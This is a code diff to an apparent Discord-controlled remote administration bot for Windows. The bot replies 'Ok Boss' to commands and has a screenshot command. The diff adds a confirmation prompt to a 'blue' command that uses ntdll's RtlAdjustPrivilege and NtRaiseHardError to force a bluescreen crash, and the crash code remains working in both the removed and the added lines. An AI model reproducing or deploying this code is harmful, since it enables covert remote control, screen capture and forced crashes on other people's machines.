@@ -1,3 +1,4 @@
+import asyncio
 import discord
 import sys
 from settings import *
@@ -219,16 +220,34 @@ async def on_message(message):
                 await message.reply("Ok Boss")
 
                 
-            if message.content == "blue" or message.content == "Blue":
-                await message.reply("Attempting...", delete_after = .1)
-                ntdll = ctypes.windll.ntdll
-                prev_value = ctypes.c_bool()
-                res = ctypes.c_ulong()
-                ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
-                if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
-                    await message.reply("Blue Successful!")
-                else:
-                    await message.reply("Blue Failed! :(")
+            if message.content.lower() == "blue":
+                new_msg = await message.reply("Are you sure you want to start a bluescreen?")
+                await new_msg.add_reaction("✅")
+                await new_msg.add_reaction("❌")
+
+                def check(reaction, user):
+                    return user == message.author and str(reaction.emoji) in ["✅", "❌"]
+
+                try:
+                    reaction, user = await client.wait_for('reaction_add', timeout=60, check=check)
+                    if str(reaction.emoji) == "✅":
+                        await message.reply("Attempting...", delete_after = .1)
+                        ntdll = ctypes.windll.ntdll
+                        prev_value = ctypes.c_bool()
+                        res = ctypes.c_ulong()
+                        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
+                        if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
+                            await message.reply("Blue Successful!")
+                        else:
+                            await message.reply("Blue Failed! :(")
+                    elif str(reaction.emoji) == "❌":
+                        delmsg =await message.channel.send("Cancelled bluescreen.")
+                        await message.delete()
+                        await new_msg.delete()
+                        await delmsg.delete()
+                except asyncio.TimeoutError:
+                    await message.channel.send("You didn't react in time.")
+               
 
             if message.content.startswith("screenshot"):
                 screenshot = pyautogui.screenshot()
